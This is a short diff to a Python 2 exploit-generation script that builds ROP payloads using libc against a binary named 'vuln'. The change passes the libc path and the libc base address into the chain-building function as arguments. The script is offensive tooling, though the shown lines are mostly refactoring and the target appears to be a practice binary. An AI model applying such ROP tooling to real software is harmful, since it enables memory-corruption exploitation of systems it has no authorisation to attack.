@@ -827,11 +827,8 @@ def find_libc_path(vuln_binary):
         return ""
     return ""
 
-def build_rop_chain_libc(lib_list, buf_address):
+def build_rop_chain_libc(lib_list, buf_address, libc_path, libc_base_address):
     result = True
-    libc_path = find_libc_path("vuln")
-
-    libc_base_address = find_library_base_addr("vuln", libc_path)
 
     f = open(libc_path, 'rb')
     if f == None:
@@ -1056,6 +1053,10 @@ if __name__ == '__main__':
     if not args.t:
         exit(10)
 
+    libc_path = find_libc_path(vuln_bin)
+
+    libc_base_address = find_library_base_addr(vuln_bin, libc_path)
+
     rop_payload = ""
 
     print '===============================================================\n'
@@ -1081,7 +1082,7 @@ if __name__ == '__main__':
         print '===============================================================\n'
         print 'Attempting to find ROP payload with libc stack frame layout ...'
         buffer_address = find_buffer_addr(vuln_bin, 392)
-        rop_payload, result = build_rop_chain_libc(lib_list, buffer_address)
+        rop_payload, result = build_rop_chain_libc(lib_list, buffer_address, libc_path, libc_base_address)
         if result == True:
             print 'Successfully built ROP payload with libc stack frame layout'
             print '===============================================================\n'
